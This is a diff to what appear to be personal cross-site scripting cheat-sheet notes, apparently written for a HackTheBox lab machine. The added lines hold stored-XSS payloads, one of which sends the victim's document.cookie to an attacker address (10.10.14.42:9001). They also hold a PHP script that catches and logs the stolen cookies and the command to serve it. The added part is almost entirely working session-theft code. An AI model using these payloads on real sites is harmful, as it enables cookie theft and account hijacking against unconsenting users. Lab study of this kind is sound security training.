@@ -52,5 +52,20 @@ exploit: `${alert(document.domain)}`
 is withing a payload or url
 ## Stored
 Really stored on a page
+<script type="text/javascript">alert(document.cookie);</script>
+
+<script type="text/javascript">document.location='http://10.10.14.42:9001/hack.php?c='+document.cookie;</script>
+
+### script to catch cookie
+create php file "hack.php"
+```php
+<?php
+header ('Location:http://moodle.schooled.htb');
+$cookies = $_GET["c"];
+$file = fopen('log.txt', 'a');
+fwrite($file, $cookies . "/n/n");
+?>
+```
+start php server with `sudo php -S 127.0.0.1:9001` on the location of the php file
 ## Dom
 Within javascript
